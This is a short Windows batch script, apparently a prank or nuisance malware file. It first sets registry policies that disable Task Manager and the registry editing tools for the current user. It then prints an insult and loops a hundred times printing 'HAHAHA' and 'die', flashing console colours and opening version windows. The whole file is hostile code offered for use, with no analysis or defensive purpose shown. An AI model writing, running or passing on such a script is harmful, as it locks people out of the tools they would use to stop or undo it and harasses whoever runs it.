@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

echo Hello Motherfucker

timeout /f 1

for /l %%x in (1, 1, 100) do (
  echo HAHAHA
  color a8
  echo die
  color e2
  winver
)
